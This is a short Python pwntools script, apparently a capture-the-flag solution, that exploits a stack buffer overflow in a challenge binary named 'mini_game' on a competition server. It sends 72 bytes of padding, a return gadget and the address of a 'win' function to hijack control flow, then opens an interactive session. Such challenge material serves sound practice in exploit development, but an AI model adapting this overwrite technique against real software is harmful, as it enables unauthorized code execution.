from pwn import *

exe = ELF("./mini_game")
p = remote("offsec.m0lecon.it", 13524)

OFFSET_TO_RIP = 72
ret_gadget = 0x40101a
win = 0x00000000004011fb

p.recvuntil(b"go?")
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(win),
)
p.send(payload)

p.interactive()
